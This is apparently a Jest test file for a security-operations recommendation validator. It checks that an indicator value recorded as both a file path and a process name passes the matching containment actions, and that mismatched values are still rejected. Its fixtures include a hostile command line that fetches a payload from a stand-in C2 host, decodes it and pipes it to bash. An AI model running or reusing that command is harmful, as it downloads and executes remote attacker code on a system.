import { RecommendationContextBuilder } from "../src/application/recommendation/services/RecommendationContextBuilder";
import { RecommendationValidator } from "../src/infrastructure/recommendation-validation/RecommendationValidator";
import { IRecommendationContextRepository } from "../src/application/recommendation/ports/IRecommendationContextRepository";
import { IActionRepository } from "../src/domain/action/repositories/IActionRepository";
import { IRunbookRepository } from "../src/domain/runbook/repositories/IRunbookRepository";
import { IPlaybookRepository } from "../src/domain/playbook/repositories/IPlaybookRepository";
import { Runbook } from "../src/domain/runbook/entities/Runbook.entity";
import { Playbook } from "../src/domain/playbook/entities/Playbook.entity";
import { ACTIONS, ACTION_RUNBOOK_CODES } from "../prisma/seeds/action.seed";
import { RUNBOOKS } from "../prisma/seeds/runbook.seed";
import { INCIDENT_PLAYBOOKS } from "../prisma/seeds/playbook.seed";

/**
 * Regression: one IOC value can be several kinds at once (TC-08: /tmp/.cache/kworkerd is both a FILE_PATH and a
 * PROCESS_NAME). The validator must check the kind the ACTION needs against ALL kinds recorded for the value - and
 * must still reject a value that does not have that kind. Real seeded catalogs; only repositories/policy are fakes.
 */
const TENANT = "tenant-1";
const PATH = "/tmp/.cache/kworkerd";
const SHA = "c488c4fbeb112223e34b76b84e06e4d6a2dc1209a664ecda48d6feb4c4448d64";
const CMD = "curl -s http://vigix-eval-c2.net:8080/x | base64 -d | bash";
const HOST = "attack-endpoint";

const actions = ACTIONS.map((a) => ({ ...a, id: `action-${a.code}`, enabled: true, runbookId: ACTION_RUNBOOK_CODES[a.code] ? `runbook-${ACTION_RUNBOOK_CODES[a.code]}` : null }));
const runbooks = RUNBOOKS.map((r) => Runbook.create({ ...r, id: `runbook-${r.code}`, tenantId: TENANT, version: "1.0", status: "ACTIVE", createdAt: new Date(), updatedAt: new Date() }));
const playbooks = [
  Playbook.create({ id: "pb-stc", tenantId: TENANT, code: "STC-001", name: "Short-Term Containment", description: null, version: "1.0", status: "ACTIVE", steps: [], triggerConditions: {} }),
  ...INCIDENT_PLAYBOOKS.map((p) => Playbook.create({
    id: `pb-${p.code}`, tenantId: TENANT, code: p.code, name: p.name, description: p.description, version: "1.0", status: "ACTIVE",
    steps: p.steps.map((s) => ({ ...s, id: `${p.code}-${s.stepOrder}` })),
    triggerConditions: { scope: "INCIDENT", incidentType: p.incidentType, mitreTechniques: p.mitreTechniques, allowedActions: p.allowedActions },
  })),
];
const actionRepository = { findAll: async () => actions, findById: async (id: string) => actions.find((a) => a.id === id) ?? null, findByCodes: async (c: string[]) => actions.filter((a) => c.includes(a.code)) } as unknown as IActionRepository;
const runbookRepository = { findAll: async () => runbooks, findById: async (id: string) => runbooks.find((r) => r.id === id) ?? null, findByCodes: async (c: string[]) => runbooks.filter((r) => c.includes(r.code)) } as unknown as IRunbookRepository;
const playbookRepository = { findAll: async () => playbooks } as unknown as IPlaybookRepository;
const policyService = { evaluate: jest.fn(async () => ({ policy: { responsibleRole: "SOC", approvalRequired: false, approvalRole: null, reviewRequired: false, reviewRole: null, matchedRules: ["RULE-A01"] } })) } as never;

type Ioc = { iocType: string; iocValue: string; source: string; reputationScore: null };
const ioc = (iocType: string, iocValue: string): Ioc => ({ iocType, iocValue, source: "ALERT", reputationScore: null });

async function contextWith(iocs: Ioc[]) {
  const repo = {
    getIncidentContext: async () => ({ incidentId: "inc-1", investigationNumber: 1, title: "VIGIX-EVAL: suspicious process executed from a world-writable path", status: "investigating", priority: "medium", alertSeverity: "medium" }),
    getIocs: async () => iocs,
    getMitreMappings: async () => [{ techniqueId: "T1059.004", tactic: "Execution", confidence: 0.85 }],
    getEvidence: async () => [{ type: "WAZUH_ALERT", source: "WAZUH", origin: "SYSTEM", title: "suspicious process", timestamp: new Date("2026-10-02T08:00:00Z"), host: HOST, ruleId: "100330", iocValues: iocs.map((i) => i.iocValue) }],
    getLatestAiAnalysis: async () => ({ summary: "Process running from /tmp.", keyFindings: ["T1059.004"], grounding: { status: "GROUNDED" as const, ungrounded: [] } }),
  } as unknown as IRecommendationContextRepository;
  const built: any = await new RecommendationContextBuilder(repo, actionRepository, runbookRepository, playbookRepository, policyService).build("inc-1", TENANT);
  return built.value ?? built;
}

const refOf = (ctx: any, type: string, value: string) => ctx.iocs.find((i: any) => i.iocType === type && i.iocValue === value).ref as string;

function step(action: string, runbook: string, target: string, targetRef: string) {
  return {
    stepOrder: 1, action, objective: `Contain ${target} on ${HOST}.`, responsibleRole: "SOC", target,
    reason: `${target} ran from a world-writable path on ${HOST} (T1059.004).`, evidenceRefs: [targetRef, "T1059.004"],
    instructions: [
      { order: 1, instruction: `Confirm ${target} against the evidence for ${HOST}.`, target, expectedResult: "Confirmed." },
      { order: 2, instruction: `Apply the containment to ${target} on ${HOST}.`, target, expectedResult: "Done." },
    ],
    playbook: "PB-SUSPICIOUS-PROCESS", runbook, verificationCriteria: `${target} is no longer present on ${HOST}.`, expectedResult: `${target} contained.`,
    missingEvidence: [], confidence: 0.8, requiresApprovalSuggested: false,
  };
}
const KILL = "RB-KILL-MALICIOUS-PROCESS", QUAR = "RB-QUARANTINE-FILE";

async function validate(iocs: Ioc[], pick: (ctx: any) => unknown[]) {
  const ctx = await contextWith(iocs);
  const r: any = await new RecommendationValidator(actionRepository, runbookRepository).validate({ summary: "Contain the process.", steps: pick(ctx) }, ctx, TENANT);
  return { ctx, r, violations: (r.violations ?? r.errors ?? []) as string[] };
}
const both = [ioc("FILE_PATH", PATH), ioc("PROCESS_NAME", PATH), ioc("SHA256", SHA), ioc("COMMAND_LINE", CMD)];
const targetProblems = (v: string[]) => v.filter((x) => /TARGET_TYPE_MISMATCH|INVENTED_TARGET|INSUFFICIENT_EVIDENCE/.test(x));

describe("RecommendationValidator - a value with several IOC kinds (FILE_PATH + PROCESS_NAME)", () => {
  it("ACT-KILL-PROCESS accepts the value through its PROCESS_NAME kind", async () => {
    const { violations } = await validate(both, (c) => [step("ACT-KILL-PROCESS", KILL, PATH, refOf(c, "PROCESS_NAME", PATH))]);
    expect(targetProblems(violations)).toEqual([]);
  });
  it("ACT-QUARANTINE-FILE accepts the same value through its FILE_PATH kind", async () => {
    const { violations } = await validate(both, (c) => [step("ACT-QUARANTINE-FILE", QUAR, PATH, refOf(c, "FILE_PATH", PATH))]);
    expect(targetProblems(violations)).toEqual([]);
  });
  it("does not depend on IOC order (PROCESS_NAME first, FILE_PATH last)", async () => {
    const reversed = [ioc("PROCESS_NAME", PATH), ioc("FILE_PATH", PATH), ioc("SHA256", SHA), ioc("COMMAND_LINE", CMD)];
    const q = await validate(reversed, (c) => [step("ACT-QUARANTINE-FILE", QUAR, PATH, refOf(c, "FILE_PATH", PATH))]);
    const k = await validate(reversed, (c) => [step("ACT-KILL-PROCESS", KILL, PATH, refOf(c, "PROCESS_NAME", PATH))]);
    expect(targetProblems(q.violations)).toEqual([]);
    expect(targetProblems(k.violations)).toEqual([]);
  });
  it("a value that is ONLY a PROCESS_NAME still fails ACT-QUARANTINE-FILE (TARGET_TYPE_MISMATCH)", async () => {
    const only = [ioc("PROCESS_NAME", PATH), ioc("SHA256", SHA), ioc("COMMAND_LINE", CMD)];
    const { violations } = await validate(only, (c) => [step("ACT-QUARANTINE-FILE", QUAR, PATH, refOf(c, "PROCESS_NAME", PATH))]);
    expect(violations.some((v) => v.startsWith("TARGET_TYPE_MISMATCH") && v.includes("is a process") && v.includes("operates on a file"))).toBe(true);
  });
  it("a value that is ONLY a FILE_PATH still fails ACT-KILL-PROCESS (TARGET_TYPE_MISMATCH)", async () => {
    const only = [ioc("FILE_PATH", PATH), ioc("SHA256", SHA), ioc("COMMAND_LINE", CMD)];
    const { violations } = await validate(only, (c) => [step("ACT-KILL-PROCESS", KILL, PATH, refOf(c, "FILE_PATH", PATH))]);
    expect(violations.some((v) => v.startsWith("TARGET_TYPE_MISMATCH") && v.includes("is a file") && v.includes("operates on a process"))).toBe(true);
  });
  it("non-colliding values keep the old behaviour: a hash is not a file, an unknown value is invented", async () => {
    const wrong = await validate(both, (c) => [step("ACT-QUARANTINE-FILE", QUAR, SHA, refOf(c, "SHA256", SHA))]);
    expect(wrong.violations.some((v) => v.startsWith("TARGET_TYPE_MISMATCH") && v.includes("is a hash"))).toBe(true);
    const invented = await validate(both, (c) => [step("ACT-KILL-PROCESS", KILL, "/tmp/other", refOf(c, "PROCESS_NAME", PATH))]);
    expect(invented.violations.some((v) => v.startsWith("INVENTED_TARGET") && v.includes("/tmp/other"))).toBe(true);
  });
});
